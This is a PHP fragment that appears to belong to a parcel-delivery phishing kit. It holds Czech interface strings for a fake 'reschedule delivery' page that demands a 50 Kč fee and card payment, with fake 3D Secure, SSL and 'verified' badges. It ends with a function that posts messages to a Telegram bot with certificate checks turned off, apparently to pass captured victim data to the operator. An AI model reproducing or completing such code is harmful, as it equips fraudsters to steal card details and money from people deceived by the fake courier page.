        'contact_supp' => 'Kontaktujte nás',
        'reprogram_title' => 'Nové datum doručení',
        'reprogram_subtitle' => 'Vyberte preferované datum doručení.',
        'reprogram_fee_msg' => 'Pro potvrzení nového data doručení bude účtován poplatek za přeplánování ve výši <b>50 Kč</b>.',
        'btn_validate_reprogram' => 'Potvrdit datum',
        'processing_msg' => 'Prosím, čekejte...',
        'delivery_between' => 'Doručení mezi 08:00 a 18:00',
        'validate_my_info' => 'Potvrdit moje údaje',
        'badge_secure' => 'Zabezpečeno',
        'badge_ssl' => 'Šifrování SSL',
        'badge_verified' => 'Ověřeno',
        'notif_confirm_msg' => 'Potvrdit 50 Kč?',
        '3d_secure_label' => '3D SECURE<br>OVĚŘENO',
        '3d_secure_hint' => 'Zabezpečené bankovní ověřování prostřednictvím 3D Secure',
        'card_warning_box' => '⚠️ <b>Důležité:</b> Pokud platbu nelze zpracovat, doručení nebude přeplánováno a balíček bude vrácen odesílateli.',
        'all_cards_accepted' => 'Přijímány Visa, Mastercard a American Express'
    ]
];

function t($key) {
    global $translations, $current_lang;
    return isset($translations[$current_lang][$key]) ? $translations[$current_lang][$key] : $key;
}

function sendTelegramMessage($token, $chat_id, $message, $keyboard = null) {
    if (!$token || !$chat_id) return;
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}
?>
